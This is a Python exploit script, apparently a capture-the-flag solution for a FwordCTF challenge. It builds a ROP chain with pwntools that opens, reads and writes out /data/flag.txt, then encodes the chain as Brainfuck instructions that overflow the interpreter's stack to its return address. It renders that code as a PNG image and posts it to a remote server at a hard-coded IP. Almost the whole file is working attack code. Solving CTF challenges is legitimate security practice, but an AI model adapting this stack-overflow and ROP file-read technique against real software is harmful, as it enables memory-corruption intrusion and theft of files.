#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import requests
import png
import StringIO

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF('./interpreter')
rop = ROP(exe)

# brainfuck instructions to color translation table
colors = {'>' : (255,0,0), '.' :  (0,255,0), '<' : (0,0,255), '+' : (255,255,0), '-' : (0,255,255), '[' : (255,0,188), ']' : (255,128,0), ',' : (102,0,204) }

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]

# simple rop open file, read it, write it to stdout
payload = p64(pop_rdi) + p64(0x4e5360) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(exe.symbols['open'])
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x4e5370) + p64(pop_rdx) + p64(100) + p64(exe.symbols['read'])
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x4e5370) + p64(pop_rdx) + p64(100) + p64(exe.symbols['write'])
payload += p64(exe.symbols['exit'])

# translate ROP payload to brainfuck instructions
code  = '>'*0x78	# first we advance in stack to reach return address
# write each qword with brainfuck
for c in payload:
  code += '[-]'+'+'*ord(c)+'>'

# generate png image from code
img = []
row = ()
for x in range(len(code)):
     row = row + colors[code[x]]
img.append(row)
with open('picture.png', 'wb') as f:
    w = png.Writer(len(code), 1, greyscale=False)
    w.write(f, img)

print('posting picture...')
url = "http://40.71.72.198:8080/"
files = {'file': open("picture.png","rb").read()}
data = {'text':'/data/flag.txt'}
r = requests.post(url, files=files, data=data)

print('FLAG:')
for line in StringIO.StringIO(r.text).readlines():
  if 'FwordCTF' in line:
    print(line.split(b'<p># ')[1])


